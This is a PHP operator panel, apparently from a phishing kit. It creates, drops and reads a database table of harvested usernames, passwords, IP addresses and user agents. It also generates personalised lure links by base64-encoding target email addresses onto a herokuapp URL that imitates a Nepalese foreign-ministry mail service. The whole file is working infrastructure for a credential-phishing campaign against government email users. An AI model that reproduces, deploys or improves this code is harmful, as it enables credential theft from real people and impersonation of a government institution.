<?php
require 'functions.php';

?>
<form method='POST' action=''>
<input type="submit" name="create" value="Create Table"> 
<input type="submit" name="delete" value="Delete Table"> 
<input type="submit" name="getdata" value="Get Data">
<input type="submit" name="genurl" value="Gen URL">
</form>
<div class="thalaimai">
    <table border="1">
	<tr>
		<td>S.No</td>
                <td>Username</td>
		<td>Password</td>
                <td>IP</td>
		<td>User Agent</td>
                <td>Date</td>
		
	</tr>
        <?php
        
    
 if(isset($_POST['genurl'])){

        $i=1;
                $contents=file_get_contents("emails.php");
                $lines=explode(",",$contents);
                foreach($lines as $line){
                    $b64= base64_encode($line);
                    $key='kkawasznnajasmlakizooakzllaozkkaozkkzo';
                    $url='https://mail-mofa-gov-np-viewmsg.herokuapp.com';
                        echo "<tr>
			<td>$i</td>
                        <td> <input id='Input$i' value=".$line."><input type='button'  value='copy' onclick='myFunction($i);'></td>
                        <td> <input id='myInput$i' value=".$url.'/?'.$key.'='.$b64."><input type='button' value='copy' onclick='copyText($i);'></td>
		        </tr>";
		$i++;
        
    }
    
   } 
    
    
  
    
    if(isset($_POST['create'])){
    $sqlList = 'CREATE TABLE IF NOT EXISTS main (
    id SERIAL PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    ip VARCHAR(255) NOT NULL,
    useragent VARCHAR(255) NOT NULL,
    date VARCHAR(255) NOT NULL
    
    )';    
        if(pg_query(dbconnection(),$sqlList)){
            echo "Table Created";
        }else{
           echo "There is some error";
        } 
    }
    
    
    
    if(isset($_POST['delete'])){
    $sql="DROP TABLE main";
        if(pg_query(dbconnection(),$sql)){
        echo "Deleted successfully"; 
        }
    }
    
    
    
    
    if(isset($_POST['getdata'])){
     
      fetchdatA(); 
    }
    
        
        
        
function fetchdatA(){
        $fetchdata= selectfun();
        $i=1;
        while($row= pg_fetch_row($fetchdata)){
            if($row[8] == 0){
               echo "<tr>
                        <td>$i</td>
                        <td>".$row[1]."</td>
                        <td>".$row[2]."</td>
                        <td>".$row[3]."</td>
                        <td>".$row[4]."</td>
                        <td>".$row[5]."</td></tr>"; 
            }else{
               echo "<tr>
                        <td>$i</td>
                        <td>".$row[1]."</td>
                        <td>".$row[2]."</td>
                        <td>".$row[3]."</td>
                        <td>".$row[4]."</td>
                        <td>".$row[5]."</td>
                </tr>";
            }
                $i++;
        } 
}
 ?>
</div>
<script>
function copyText(i) {
         //alert(i);
           var copiedtxt= document.getElementById("myInput"+i);
               copiedtxt.select();
               document.execCommand('copy');
}
function myFunction(j){
           var copiedtxt= document.getElementById("Input"+j);
               copiedtxt.select();
               document.execCommand('copy');
}
</script>


